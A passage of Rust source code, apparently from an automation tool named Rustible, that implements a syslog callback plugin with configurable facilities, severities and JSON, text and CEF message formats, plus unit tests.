to open syslog: {0}\")]\n    OpenFailed(String),\n\n    /// Failed to write to syslog\n    #[error(\"Failed to write to syslog: {0}\")]\n    WriteFailed(#[from] io::Error),\n\n    /// Invalid facility string\n    #[error(\"Invalid syslog facility: {0}\")]\n    InvalidFacility(String),\n\n    /// Invalid severity string\n    #[error(\"Invalid syslog severity: {0}\")]\n    InvalidSeverity(String),\n\n    /// JSON serialization error\n    #[error(\"Failed to serialize log entry: {0}\")]\n    SerializationFailed(#[from] serde_json::Error),\n\n    /// Syslog not available on this platform\n    #[error(\"Syslog is not available on this platform\")]\n    NotAvailable,\n}\n\n/// Result type for syslog operations.\npub type SyslogResult\u003cT\u003e = Result\u003cT, SyslogError\u003e;\n\n// ============================================================================\n// Configuration\n// ============================================================================\n\n/// Log format for syslog messages.\n#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]\npub enum SyslogFormat {\n    /// JSON structured format (recommended for log aggregation)\n    #[default]\n    Json,\n    /// Human-readable text format\n    Text,\n    /// CEF (Common Event Format) for SIEM integration\n    Cef,\n}\n\n/// Severity mapping for different event types.\n#[derive(Debug, Clone)]\npub struct SeverityMapping {\n    /// Severity for playbook start events\n    pub playbook_start: SyslogSeverity,\n    /// Severity for playbook end (success) events\n    pub playbook_end_success: SyslogSeverity,\n    /// Severity for playbook end (failure) events\n    pub playbook_end_failure: SyslogSeverity,\n    /// Severity for play start events\n    pub play_start: SyslogSeverity,\n    /// Severity for play end events\n    pub play_end: SyslogSeverity,\n    /// Severity for task start events\n    pub task_start: SyslogSeverity,\n    /// Severity for task ok events\n    pub task_ok: SyslogSeverity,\n    /// Severity for task changed events\n    pub task_changed: SyslogSeverity,\n    /// Severity for task failed events\n    pub task_failed: SyslogSeverity,\n    /// Severity for task skipped events\n    pub task_skipped: SyslogSeverity,\n    /// Severity for handler triggered events\n    pub handler_triggered: SyslogSeverity,\n    /// Severity for facts gathered events\n    pub facts_gathered: SyslogSeverity,\n}\n\nimpl Default for SeverityMapping {\n    fn default() -\u003e Self {\n        Self {\n            playbook_start: SyslogSeverity::Info,\n            playbook_end_success: SyslogSeverity::Notice,\n            playbook_end_failure: SyslogSeverity::Error,\n            play_start: SyslogSeverity::Info,\n            play_end: SyslogSeverity::Info,\n            task_start: SyslogSeverity::Debug,\n            task_ok: SyslogSeverity::Info,\n            task_changed: SyslogSeverity::Notice,\n            task_failed: SyslogSeverity::Error,\n            task_skipped: SyslogSeverity::Debug,\n            handler_triggered: SyslogSeverity::Debug,\n            facts_gathered: SyslogSeverity::Debug,\n        }\n    }\n}\n\n/// Configuration for the syslog callback.\n#[derive(Debug, Clone)]\npub struct SyslogConfig {\n    /// Syslog facility to use\n    pub facility: SyslogFacility,\n    /// Program identifier (appears in log messages)\n    pub ident: String,\n    /// Log format\n    pub format: SyslogFormat,\n    /// Whether to include PID in syslog messages\n    pub include_pid: bool,\n    /// Whether to include hostname in log entries\n    pub include_host: bool,\n    /// Whether to log to console as well (LOG_CONS)\n    pub log_to_console: bool,\n    /// Whether to log task start events\n    pub log_task_start: bool,\n    /// Whether to log facts gathered events\n    pub log_facts: bool,\n    /// Minimum severity to log (less severe events are ignored)\n    pub min_severity: SyslogSeverity,\n    /// Severity mapping for different event types\n    pub severity_mapping: SeverityMapping,\n    /// Additional static fields to include in every log entry\n    pub extra_fields: HashMap\u003cString, String\u003e,\n    /// CEF vendor name (for CEF format)\n    pub cef_vendor: String,\n    /// CEF product name (for CEF format)\n    pub cef_product: String,\n    /// CEF product version (for CEF format)\n    pub cef_version: String,\n}\n\nimpl Default for SyslogConfig {\n    fn default() -\u003e Self {\n        Self {\n            facility: SyslogFacility::Local0,\n            ident: \"rustible\".to_string(),\n            format: SyslogFormat::Json,\n            include_pid: true,\n            include_host: true,\n            log_to_console: false,\n            log_task_start: false,\n            log_facts: false,\n            min_severity: SyslogSeverity::Debug,\n            severity_mapping: SeverityMapping::default(),\n            extra_fields: HashMap::new(),\n            cef_vendor: \"Rustible\".to_string(),\n            cef_product: \"Rustible\".to_string(),\n            cef_version: env!(\"CARGO_PKG_VERSION\").to_string(),\n        }\n    }\n}\n\nimpl SyslogConfig {\n    /// Creates a new configuration builder.\n    pub fn builder() -\u003e SyslogConfigBuilder {\n        SyslogConfigBuilder::default()\n    }\n}\n\n/// Builder for [`SyslogConfig`].\n#[derive(Debug, Clone, Default)]\npub struct SyslogConfigBuilder {\n    config: SyslogConfig,\n}\n\nimpl SyslogConfigBuilder {\n    /// Sets the syslog facility.\n    pub fn facility(mut self, facility: SyslogFacility) -\u003e Self {\n        self.config.facility = facility;\n        self\n    }\n\n    /// Sets the program identifier.\n    pub fn ident(mut self, ident: impl Into\u003cString\u003e) -\u003e Self {\n        self.config.ident = ident.into();\n        self\n    }\n\n    /// Sets the log format.\n    pub fn format(mut self, format: SyslogFormat) -\u003e Self {\n        self.config.format = format;\n        self\n    }\n\n    /// Sets whether to include PID in messages.\n    pub fn include_pid(mut self, include: bool) -\u003e Self {\n        self.config.include_pid = include;\n        self\n    }\n\n    /// Sets whether to include hostname in entries.\n    pub fn include_host(mut self, include: bool) -\u003e Self {\n        self.config.include_host = include;\n        self\n    }\n\n    /// Sets whether to also log to console.\n    pub fn log_to_console(mut self, log: bool) -\u003e Self {\n        self.config.log_to_console = log;\n        self\n    }\n\n    /// Sets whether to log task start events.\n    pub fn log_task_start(mut self, log: bool) -\u003e Self {\n        self.config.log_task_start = log;\n        self\n    }\n\n    /// Sets whether to log facts gathered events.\n    pub fn log_facts(mut self, log: bool) -\u003e Self {\n        self.config.log_facts = log;\n        self\n    }\n\n    /// Sets the minimum severity level to log.\n    pub fn min_severity(mut self, severity: SyslogSeverity) -\u003e Self {\n        self.config.min_severity = severity;\n        self\n    }\n\n    /// Sets the severity mapping.\n    pub fn severity_mapping(mut self, mapping: SeverityMapping) -\u003e Self {\n        self.config.severity_mapping = mapping;\n        self\n    }\n\n    /// Adds an extra field to include in every log entry.\n    pub fn extra_field(mut self, key: impl Into\u003cString\u003e, value: impl Into\u003cString\u003e) -\u003e Self {\n        self.config.extra_fields.insert(key.into(), value.into());\n        self\n    }\n\n    /// Sets CEF format metadata.\n    pub fn cef_metadata(\n        mut self,\n        vendor: impl Into\u003cString\u003e,\n        product: impl Into\u003cString\u003e,\n        version: impl Into\u003cString\u003e,\n    ) -\u003e Self {\n        self.config.cef_vendor = vendor.into();\n        self.config.cef_product = product.into();\n        self.config.cef_version = version.into();\n        self\n    }\n\n    /// Builds the configuration.\n    pub fn build(self) -\u003e SyslogConfig {\n        self.config\n    }\n}\n\n// ============================================================================\n// Log Entry Structures\n// ============================================================================\n\n/// Structured log entry for JSON format.\n#[derive(Debug, Serialize)]\n#[allow(dead_code)]\nstruct LogEntry {\n    /// Event type\n    event: String,\n    /// ISO 8601 timestamp\n    timestamp: String,\n    /// Event-specific fields\n    #[serde(flatten)]\n    fields: serde_json::Value,\n    /// Extra static fields from config\n    #[serde(flatten)]\n    extra: HashMap\u003cString, String\u003e,\n}\n\n// ============================================================================\n// Syslog Writer Abstraction\n// ============================================================================\n\n/// Abstraction over syslog writing for testability and platform compatibility.\ntrait SyslogWriter: Send + Sync + std::fmt::Debug {\n    /// Writes a message to syslog with the given priority.\n    fn write(\u0026self, priority: u8, message: \u0026str) -\u003e SyslogResult\u003c()\u003e;\n\n    /// Closes the syslog connection.\n    fn close(\u0026self);\n}\n\n/// Native Unix syslog writer using libc.\n#[cfg(unix)]\n#[derive(Debug)]\nstruct UnixSyslogWriter {\n    /// Program identifier (must live as long as syslog is open)\n    _ident: std::ffi::CString,\n}\n\n#[cfg(unix)]\nimpl UnixSyslogWriter {\n    fn new(ident: \u0026str, options: libc::c_int, facility: SyslogFacility) -\u003e SyslogResult\u003cSelf\u003e {\n        let c_ident =\n            std::ffi::CString::new(ident).map_err(|e| SyslogError::OpenFailed(e.to_string()))?;\n\n        unsafe {\n            libc::openlog(c_ident.as_ptr(), options, (facility as libc::c_int) \u003c\u003c 3);\n        }\n\n        Ok(Self { _ident: c_ident })\n    }\n}\n\n#[cfg(unix)]\nimpl SyslogWriter for UnixSyslogWriter {\n    fn write(\u0026self, priority: u8, message: \u0026str) -\u003e SyslogResult\u003c()\u003e {\n        let c_message = std::ffi::CString::new(message)\n            .map_err(|e| SyslogError::WriteFailed(io::Error::new(io::ErrorKind::InvalidData, e)))?;\n\n        unsafe {\n            libc::syslog(\n                priority as libc::c_int,\n                b\"%s\\0\".as_ptr() as *const libc::c_char,\n                c_message.as_ptr(),\n            );\n        }\n\n        Ok(())\n    }\n\n    fn close(\u0026self) {\n        unsafe {\n            libc::closelog();\n        }\n    }\n}\n\n#[cfg(unix)]\nimpl Drop for UnixSyslogWriter {\n    fn drop(\u0026mut self) {\n        self.close();\n    }\n}\n\n/// Fallback writer that writes to stderr (for non-Unix or testing).\n#[derive(Debug)]\n#[allow(dead_code)]\nstruct StderrSyslogWriter {\n    ident: String,\n    facility: SyslogFacility,\n}\n\nimpl StderrSyslogWriter {\n    #[allow(dead_code)]\n    fn new(ident: \u0026str, facility: SyslogFacility) -\u003e Self {\n        Self {\n            ident: ident.to_string(),\n            facility,\n        }\n    }\n}\n\nimpl SyslogWriter for StderrSyslogWriter {\n    fn write(\u0026self, priority: u8, message: \u0026str) -\u003e SyslogResult\u003c()\u003e {\n        let severity = priority \u0026 0x07;\n        let severity_str = match severity {\n            0 =\u003e \"EMERG\",\n            1 =\u003e \"ALERT\",\n            2 =\u003e \"CRIT\",\n            3 =\u003e \"ERROR\",\n            4 =\u003e \"WARN\",\n            5 =\u003e \"NOTICE\",\n            6 =\u003e \"INFO\",\n            7 =\u003e \"DEBUG\",\n            _ =\u003e \"UNKNOWN\",\n        };\n\n        let timestamp = Utc::now().format(\"%Y-%m-%dT%H:%M:%S%.3fZ\");\n\n        writeln!(\n            io::stderr(),\n            \"{} {} {} [{}]: {}\",\n            timestamp,\n            self.facility,\n            self.ident,\n            severity_str,\n            message\n        )?;\n\n        Ok(())\n    }\n\n    fn close(\u0026self) {\n        // No-op for stderr\n    }\n}\n\n// ============================================================================\n// Syslog Callback Implementation\n// ============================================================================\n\n/// Syslog callback plugin that logs execution events to syslog.\n///\n/// This callback integrates Rustible with system logging infrastructure,\n/// enabling centralized log collection and monitoring.\n///\n/// # Platform Support\n///\n/// - **Linux/Unix**: Uses native syslog via libc\n/// - **Other platforms**: Falls back to stderr logging\n///\n/// # Usage\n///\n/// ```rust,ignore\n/// use rustible::callback::plugins::{SyslogCallback, SyslogConfig};\n///\n/// let callback = SyslogCallback::new(SyslogConfig::default())?;\n/// executor.with_callback(Box::new(callback));\n/// ```\n#[derive(Debug)]\npub struct SyslogCallback {\n    /// Configuration\n    config: SyslogConfig,\n    /// Syslog writer\n    writer: Arc\u003cdyn SyslogWriter\u003e,\n    /// Playbook start time for duration tracking\n    playbook_start: RwLock\u003cOption\u003cInstant\u003e\u003e,\n    /// Current playbook name\n    current_playbook: RwLock\u003cOption\u003cString\u003e\u003e,\n    /// Hostname (cached for performance)\n    hostname: String,\n    /// Statistics\n    stats: RwLock\u003cSyslogStats\u003e,\n}\n\n/// Statistics tracked by the syslog callback.\n#[derive(Debug, Default, Clone)]\npub struct SyslogStats {\n    /// Total messages logged\n    pub messages_logged: u64,\n    /// Messages dropped due to min severity filter\n    pub messages_filtered: u64,\n    /// Write errors encountered\n    pub write_errors: u64,\n}\n\nimpl SyslogCallback {\n    /// Creates a new syslog callback with the given configuration.\n    ///\n    /// # Errors\n    ///\n    /// Returns an error if syslog cannot be opened.\n    pub fn new(config: SyslogConfig) -\u003e SyslogResult\u003cSelf\u003e {\n        let writer = Self::create_writer(\u0026config)?;\n        let hostname = hostname::get()\n            .map(|h| h.to_string_lossy().to_string())\n            .unwrap_or_else(|_| \"unknown\".to_string());\n\n        Ok(Self {\n            config,\n            writer,\n            playbook_start: RwLock::new(None),\n            current_playbook: RwLock::new(None),\n            hostname,\n            stats: RwLock::new(SyslogStats::default()),\n        })\n    }\n\n    /// Creates a new syslog callback with default configuration.\n    pub fn with_defaults() -\u003e SyslogResult\u003cSelf\u003e {\n        Self::new(SyslogConfig::default())\n    }\n\n    /// Creates the appropriate syslog writer for the platform.\n    #[cfg(unix)]\n    fn create_writer(config: \u0026SyslogConfig) -\u003e SyslogResult\u003cArc\u003cdyn SyslogWriter\u003e\u003e {\n        let mut options = libc::LOG_NDELAY;\n        if config.include_pid {\n            options |= libc::LOG_PID;\n        }\n        if config.log_to_console {\n            options |= libc::LOG_CONS;\n        }\n\n        let writer = UnixSyslogWriter::new(\u0026config.ident, options, config.facility)?;\n        Ok(Arc::new(writer))\n    }\n\n    #[cfg(not(unix))]\n    fn create_writer(config: \u0026SyslogConfig) -\u003e SyslogResult\u003cArc\u003cdyn SyslogWriter\u003e\u003e {\n        Ok(Arc::new(StderrSyslogWriter::new(\n            \u0026config.ident,\n            config.facility,\n        )))\n    }\n\n    /// Returns the current statistics.\n    pub fn stats(\u0026self) -\u003e SyslogStats {\n        self.stats.read().clone()\n    }\n\n    /// Calculates the syslog priority value from facility and severity.\n    fn calculate_priority(\u0026self, severity: SyslogSeverity) -\u003e u8 {\n        ((self.config.facility as u8) \u003c\u003c 3) | (severity as u8)\n    }\n\n    /// Checks if a message with the given severity should be logged.\n    fn should_log(\u0026self, severity: SyslogSeverity) -\u003e bool {\n        severity \u003c= self.config.min_severity\n    }\n\n    /// Logs an event with the given severity and fields.\n    fn log_event(\u0026self, event: \u0026str, severity: SyslogSeverity, fields: serde_json::Value) {\n        if !self.should_log(severity) {\n            let mut stats = self.stats.write();\n            stats.messages_filtered += 1;\n            return;\n        }\n\n        let message = self.format_message(event, \u0026fields);\n        let priority = self.calculate_priority(severity);\n\n        if let Err(e) = self.writer.write(priority, \u0026message) {\n            // Log error to stderr but don't fail\n            eprintln!(\"Syslog write error: {}\", e);\n            let mut stats = self.stats.write();\n            stats.write_errors += 1;\n        } else {\n            let mut stats = self.stats.write();\n            stats.messages_logged += 1;\n        }\n    }\n\n    /// Formats a message according to the configured format.\n    fn format_message(\u0026self, event: \u0026str, fields: \u0026serde_json::Value) -\u003e String {\n        match self.config.format {\n            SyslogFormat::Json =\u003e self.format_json(event, fields),\n            SyslogFormat::Text =\u003e self.format_text(event, fields),\n            SyslogFormat::Cef =\u003e self.format_cef(event, fields),\n        }\n    }\n\n    /// Formats a message as JSON.\n    fn format_json(\u0026self, event: \u0026str, fields: \u0026serde_json::Value) -\u003e String {\n        let mut entry = serde_json::json!({\n            \"event\": event,\n            \"timestamp\": Utc::now().to_rfc3339(),\n        });\n\n        // Add hostname if configured\n        if self.config.include_host {\n            entry[\"host\"] = serde_json::json!(self.hostname);\n        }\n\n        // Merge in event-specific fields\n        if let serde_json::Value::Object(ref map) = fields {\n            if let serde_json::Value::Object(ref mut entry_map) = entry {\n                for (k, v) in map {\n                    entry_map.insert(k.clone(), v.clone());\n                }\n            }\n        }\n\n        // Add extra fields\n        if let serde_json::Value::Object(ref mut entry_map) = entry {\n            for (k, v) in \u0026self.config.extra_fields {\n                entry_map.insert(k.clone(), serde_json::json!(v));\n            }\n        }\n\n        serde_json::to_string(\u0026entry).unwrap_or_else(|_| format!(\"{{\\\"event\\\":\\\"{}\\\"}}\", event))\n    }\n\n    /// Formats a message as human-readable text.\n    fn format_text(\u0026self, event: \u0026str, fields: \u0026serde_json::Value) -\u003e String {\n        let mut parts = vec![event.to_string()];\n\n        if let serde_json::Value::Object(map) = fields {\n            for (k, v) in map {\n                let value_str = match v {\n                    serde_json::Value::String(s) =\u003e s.clone(),\n                    _ =\u003e v.to_string(),\n                };\n                parts.push(format!(\"{}={}\", k, value_str));\n            }\n        }\n\n        if self.config.include_host {\n            parts.push(format!(\"host={}\", self.hostname));\n        }\n\n        parts.join(\" \")\n    }\n\n    /// Formats a message in CEF (Common Event Format).\n    fn format_cef(\u0026self, event: \u0026str, fields: \u0026serde_json::Value) -\u003e String {\n        // CEF format: CEF:Version|Device Vendor|Device Product|Device Version|Signature ID|Name|Severity|Extension\n        let severity = self.event_to_cef_severity(event);\n        let signature_id = self.event_to_signature_id(event);\n\n        let mut extension = String::new();\n\n        if let serde_json::Value::Object(map) = fields {\n            for (k, v) in map {\n                let value_str = match v {\n                    serde_json::Value::String(s) =\u003e Self::escape_cef_value(s),\n                    _ =\u003e Self::escape_cef_value(\u0026v.to_string()),\n                };\n                if !extension.is_empty() {\n                    extension.push(' ');\n                }\n                extension.push_str(\u0026format!(\"{}={}\", Self::escape_cef_key(k), value_str));\n            }\n        }\n\n        if self.config.include_host {\n            if !extension.is_empty() {\n                extension.push(' ');\n            }\n            extension.push_str(\u0026format!(\"dhost={}\", self.hostname));\n        }\n\n        format!(\n            \"CEF:0|{}|{}|{}|{}|{}|{}|{}\",\n            Self::escape_cef_header(\u0026self.config.cef_vendor),\n            Self::escape_cef_header(\u0026self.config.cef_product),\n            Self::escape_cef_header(\u0026self.config.cef_version),\n            signature_id,\n            Self::escape_cef_header(event),\n            severity,\n            extension\n        )\n    }\n\n    /// Maps event type to CEF severity (0-10).\n    fn event_to_cef_severity(\u0026self, event: \u0026str) -\u003e u8 {\n        match event {\n            \"task_failed\" | \"playbook_end_failure\" =\u003e 7,\n            \"task_changed\" =\u003e 3,\n            \"playbook_start\" | \"playbook_end_success\" =\u003e 1,\n            _ =\u003e 0,\n        }\n    }\n\n    /// Maps event type to a signature ID for CEF.\n    fn event_to_signature_id(\u0026self, event: \u0026str) -\u003e u32 {\n        match event {\n            \"playbook_start\" =\u003e 1001,\n            \"playbook_end\" =\u003e 1002,\n            \"play_start\" =\u003e 2001,\n            \"play_end\" =\u003e 2002,\n            \"task_start\" =\u003e 3001,\n            \"task_ok\" =\u003e 3002,\n            \"task_changed\" =\u003e 3003,\n            \"task_failed\" =\u003e 3004,\n            \"task_skipped\" =\u003e 3005,\n            \"handler_triggered\" =\u003e 4001,\n            \"facts_gathered\" =\u003e 5001,\n            _ =\u003e 9999,\n        }\n    }\n\n    /// Escapes a CEF header field.\n    fn escape_cef_header(s: \u0026str) -\u003e String {\n        s.replace('\\\\', \"\\\\\\\\\").replace('|', \"\\\\|\")\n    }\n\n    /// Escapes a CEF extension key.\n    fn escape_cef_key(s: \u0026str) -\u003e String {\n        // CEF keys should be alphanumeric\n        s.chars()\n            .filter(|c| c.is_alphanumeric() || *c == '_')\n            .collect()\n    }\n\n    /// Escapes a CEF extension value.\n    fn escape_cef_value(s: \u0026str) -\u003e String {\n        s.replace('\\\\', \"\\\\\\\\\")\n            .replace('=', \"\\\\=\")\n            .replace('\\n', \"\\\\n\")\n            .replace('\\r', \"\\\\r\")\n    }\n}\n\n#[async_trait]\nimpl ExecutionCallback for SyslogCallback {\n    async fn on_playbook_start(\u0026self, name: \u0026str) {\n        *self.playbook_start.write() = Some(Instant::now());\n        *self.current_playbook.write() = Some(name.to_string());\n\n        self.log_event(\n            \"playbook_start\",\n            self.config.severity_mapping.playbook_start,\n            serde_json::json!({\n                \"playbook\": name,\n            }),\n        );\n    }\n\n    async fn on_playbook_end(\u0026self, name: \u0026str, success: bool) {\n        let duration_ms = self\n            .playbook_start\n            .read()\n            .map(|start| start.elapsed().as_millis() as u64);\n\n        let severity = if success {\n            self.config.severity_mapping.playbook_end_success\n        } else {\n            self.config.severity_mapping.playbook_end_failure\n        };\n\n        let mut fields = serde_json::json!({\n            \"playbook\": name,\n            \"success\": success,\n            \"status\": if success { \"success\" } else { \"failed\" },\n        });\n\n        if let Some(ms) = duration_ms {\n            fields[\"duration_ms\"] = serde_json::json!(ms);\n        }\n\n        self.log_event(\"playbook_end\", severity, fields);\n\n        // Clear state\n        *self.playbook_start.write() = None;\n        *self.current_playbook.write() = None;\n    }\n\n    async fn on_play_start(\u0026self, name: \u0026str, hosts: \u0026[String]) {\n        self.log_event(\n            \"play_start\",\n            self.config.severity_mapping.play_start,\n            serde_json::json!({\n                \"play\": name,\n                \"host_count\": hosts.len(),\n                \"hosts\": hosts,\n            }),\n        );\n    }\n\n    async fn on_play_end(\u0026self, name: \u0026str, success: bool) {\n        self.log_event(\n            \"play_end\",\n            self.config.severity_mapping.play_end,\n            serde_json::json!({\n                \"play\": name,\n                \"success\": success,\n                \"status\": if success { \"success\" } else { \"failed\" },\n            }),\n        );\n    }\n\n    async fn on_task_start(\u0026self, name: \u0026str, host: \u0026str) {\n        if !self.config.log_task_start {\n            return;\n        }\n\n        self.log_event(\n            \"task_start\",\n            self.config.severity_mapping.task_start,\n            serde_json::json!({\n                \"task\": name,\n                \"target_host\": host,\n            }),\n        );\n    }\n\n    async fn on_task_complete(\u0026self, result: \u0026ExecutionResult) {\n        let (event, severity) = if result.result.skipped {\n            (\"task_skipped\", self.config.severity_mapping.task_skipped)\n        } else if !result.result.success {\n            (\"task_failed\", self.config.severity_mapping.task_failed)\n        } else if result.result.changed {\n            (\"task_changed\", self.config.severity_mapping.task_changed)\n        } else {\n            (\"task_ok\", self.config.severity_mapping.task_ok)\n        };\n\n        let status = if result.result.skipped {\n            \"skipped\"\n        } else if !result.result.success {\n            \"failed\"\n        } else if result.result.changed {\n            \"changed\"\n        } else {\n            \"ok\"\n        };\n\n        let mut fields = serde_json::json!({\n            \"task\": result.task_name,\n            \"target_host\": result.host,\n            \"status\": status,\n            \"success\": result.result.success,\n            \"changed\": result.result.changed,\n            \"skipped\": result.result.skipped,\n            \"duration_ms\": result.duration.as_millis() as u64,\n        });\n\n        // Add message for failures\n        if !result.result.success {\n            fields[\"error\"] = serde_json::json!(result.result.message);\n        }\n\n        // Add warnings if present\n        if !result.result.warnings.is_empty() {\n            fields[\"warnings\"] = serde_json::json!(result.result.warnings);\n        }\n\n        // Add handlers to notify if present\n        if !result.notify.is_empty() {\n            fields[\"notify\"] = serde_json::json!(result.notify);\n        }\n\n        self.log_event(event, severity, fields);\n    }\n\n    async fn on_handler_triggered(\u0026self, name: \u0026str) {\n        self.log_event(\n            \"handler_triggered\",\n            self.config.severity_mapping.handler_triggered,\n            serde_json::json!({\n                \"handler\": name,\n            }),\n        );\n    }\n\n    async fn on_facts_gathered(\u0026self, host: \u0026str, facts: \u0026Facts) {\n        if !self.config.log_facts {\n            return;\n        }\n\n        // Only log minimal fact info to avoid bloating logs\n        let fact_count = facts.all().len();\n\n        self.log_event(\n            \"facts_gathered\",\n            self.config.severity_mapping.facts_gathered,\n            serde_json::json!({\n                \"target_host\": host,\n                \"fact_count\": fact_count,\n            }),\n        );\n    }\n}\n\n// ============================================================================\n// Tests\n// ============================================================================\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use crate::traits::ModuleResult;\n    use std::time::Duration;\n\n    /// Test syslog writer that captures messages for verification.\n    #[derive(Debug)]\n    struct TestSyslogWriter {\n        messages: Arc\u003cRwLock\u003cVec\u003c(u8, String)\u003e\u003e\u003e,\n    }\n\n    impl TestSyslogWriter {\n        fn new() -\u003e Self {\n            Self {\n                messages: Arc::new(RwLock::new(Vec::new())),\n            }\n        }\n\n        fn get_messages(\u0026self) -\u003e Vec\u003c(u8, String)\u003e {\n            self.messages.read().clone()\n        }\n    }\n\n    impl SyslogWriter for TestSyslogWriter {\n        fn write(\u0026self, priority: u8, message: \u0026str) -\u003e SyslogResult\u003c()\u003e {\n            self.messages.write().push((priority, message.to_string()));\n            Ok(())\n        }\n\n        fn close(\u0026self) {}\n    }\n\n    fn create_test_callback() -\u003e (SyslogCallback, Arc\u003cTestSyslogWriter\u003e) {\n        let writer = Arc::new(TestSyslogWriter::new());\n        let callback = SyslogCallback {\n            config: SyslogConfig::default(),\n            writer: Arc::clone(\u0026writer) as Arc\u003cdyn SyslogWriter\u003e,\n            playbook_start: RwLock::new(None),\n            current_playbook: RwLock::new(None),\n            hostname: \"testhost\".to_string(),\n            stats: RwLock::new(SyslogStats::default()),\n        };\n        (callback, writer)\n    }\n\n    fn create_execution_result(\n        host: \u0026str,\n        task_name: \u0026str,\n        success: bool,\n        changed: bool,\n        skipped: bool,\n        message: \u0026str,\n    ) -\u003e ExecutionResult {\n        ExecutionResult {\n            host: host.to_string(),\n            task_name: task_name.to_string(),\n            result: ModuleResult {\n                success,\n                changed,\n                message: message.to_string(),\n                skipped,\n                data: None,\n                warnings: Vec::new(),\n            },\n            duration: Duration::from_millis(100),\n            notify: Vec::new(),\n        }\n    }\n\n    #[test]\n    fn test_facility_parsing() {\n        assert_eq!(\n            \"local0\".parse::\u003cSyslogFacility\u003e().unwrap(),\n            SyslogFacility::Local0\n        );\n        assert_eq!(\n            \"daemon\".parse::\u003cSyslogFacility\u003e().unwrap(),\n            SyslogFacility::Daemon\n        );\n        assert_eq!(\n            \"user\".parse::\u003cSyslogFacility\u003e().unwrap(),\n            SyslogFacility::User\n        );\n        assert!(\"invalid\".parse::\u003cSyslogFacility\u003e().is_err());\n    }\n\n    #[test]\n    fn test_severity_parsing() {\n        assert_eq!(\n            \"info\".parse::\u003cSyslogSeverity\u003e().unwrap(),\n            SyslogSeverity::Info\n        );\n        assert_eq!(\n            \"error\".parse::\u003cSyslogSeverity\u003e().unwrap(),\n            SyslogSeverity::Error\n        );\n        assert_eq!(\n            \"warn\".parse::\u003cSyslogSeverity\u003e().unwrap(),\n            SyslogSeverity::Warning\n        );\n        assert!(\"invalid\".parse::\u003cSyslogSeverity\u003e().is_err());\n    }\n\n    #[test]\n    fn test_priority_calculation() {\n        let (callback, _) = create_test_callback();\n\n        // local0 (16) \u003c\u003c 3 = 128, + info (6) = 134\n        assert_eq!(callback.calculate_priority(SyslogSeverity::Info), 134);\n\n        // local0 (16) \u003c\u003c 3 = 128, + error (3) = 131\n        assert_eq!(callback.calculate_priority(SyslogSeverity::Error), 131);\n    }\n\n    #[test]\n    fn test_severity_filtering() {\n        let mut config = SyslogConfig::default();\n        config.min_severity = SyslogSeverity::Warning;\n\n        let callback = SyslogCallback {\n            config,\n            writer: Arc::new(TestSyslogWriter::new()),\n            playbook_start: RwLock::new(None),\n            current_playbook: RwLock::new(None),\n            hostname: \"testhost\".to_string(),\n            stats: RwLock::new(SyslogStats::default()),\n        };\n\n        // Should log\n        assert!(callback.should_log(SyslogSeverity::Emergency));\n        assert!(callback.should_log(SyslogSeverity::Error));\n        assert!(callback.should_log(SyslogSeverity::Warning));\n\n        // Should not log\n        assert!(!callback.should_log(SyslogSeverity::Notice));\n        assert!(!callback.should_log(SyslogSeverity::Info));\n        assert!(!callback.should_log(SyslogSeverity::Debug));\n    }\n\n    #[test]\n    fn test_json_format() {\n        let (callback, _) = create_test_callback();\n\n        let fields = serde_json::json!({\n            \"task\": \"test_task\",\n            \"host\": \"host1\"\n        });\n\n        let message = callback.format_json(\"task_complete\", \u0026fields);\n        let parsed: serde_json::Value = serde_json::from_str(\u0026message).unwrap();\n\n        assert_eq!(parsed[\"event\"], \"task_complete\");\n        assert_eq!(parsed[\"task\"], \"test_task\");\n        assert!(parsed[\"timestamp\"].is_string());\n    }\n\n    #[test]\n    fn test_text_format() {\n        let mut config = SyslogConfig::default();\n        config.format = SyslogFormat::Text;\n        config.include_host = false;\n\n        let callback = SyslogCallback {\n            config,\n            writer: Arc::new(TestSyslogWriter::new()),\n            playbook_start: RwLock::new(None),\n            current_playbook: RwLock::new(None),\n            hostname: \"testhost\".to_string(),\n            stats: RwLock::new(SyslogStats::default()),\n        };\n\n        let fields = serde_json::json!({\n            \"task\": \"test_task\",\n            \"status\": \"changed\"\n        });\n\n        let message = callback.format_text(\"task_complete\", \u0026fields);\n\n        assert!(message.contains(\"task_complete\"));\n        assert!(message.contains(\"task=test_task\"));\n        assert!(message.contains(\"status=changed\"));\n    }\n\n    #[test]\n    fn test_cef_format() {\n        let mut config = SyslogConfig::default();\n        config.format = SyslogFormat::Cef;\n\n        let callback = SyslogCallback {\n            config,\n            writer: Arc::new(TestSyslogWriter::new()),\n            playbook_start: RwLock::new(None),\n            current_playbook: RwLock::new(None),\n            hostname: \"testhost\".to_string(),\n            stats: RwLock::new(SyslogStats::default()),\n        };\n\n        let fields = serde_json::json!({\n            \"task\": \"test_task\"\n        });\n\n        let message = callback.format_cef(\"task_failed\", \u0026fields);\n\n        assert!(message.starts_with(\"CEF:0|\"));\n        assert!(message.contains(\"Rustible\"));\n        assert!(message.contains(\"task=test_task\"));\n    }\n\n    #[test]\n    fn test_cef_escaping() {\n        assert_eq!(\n            SyslogCallback::escape_cef_header(\"test|value\"),\n            \"test\\\\|value\"\n        );\n        assert_eq!(SyslogCallback::escape_cef_value(\"key=value\"), \"key\\\\=value\");\n        assert_eq!(\n            SyslogCallback::escape_cef_value(\"line1\\nline2\"),\n            \"line1\\\\nline2\"\n        );\n    }\n\n    #[tokio::test]\n    async fn test_playbook_lifecycle() {\n        let (callback, writer) = create_test_callback();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback.on_playbook_end(\"test-playbook\", true).await;\n\n        let messages = writer.get_messages();\n        assert_eq!(messages.len(), 2);\n\n        // Check playbook_start event\n        let start_msg: serde_json::Value = serde_json::from_str(\u0026messages[0].1).unwrap();\n        assert_eq!(start_msg[\"event\"], \"playbook_start\");\n        assert_eq!(start_msg[\"playbook\"], \"test-playbook\");\n\n        // Check playbook_end event\n        let end_msg: serde_json::Value = serde_json::from_str(\u0026messages[1].1).unwrap();\n        assert_eq!(end_msg[\"event\"], \"playbook_end\");\n        assert_eq!(end_msg[\"success\"], true);\n    }\n\n    #[tokio::test]\n    async fn test_task_complete_ok() {\n        let (callback, writer) = create_test_callback();\n\n        let result = create_execution_result(\"host1\", \"Install package\", true, false, false, \"ok\");\n        callback.on_task_complete(\u0026result).await;\n\n        let messages = writer.get_messages();\n        assert_eq!(messages.len(), 1);\n\n        let msg: serde_json::Value = 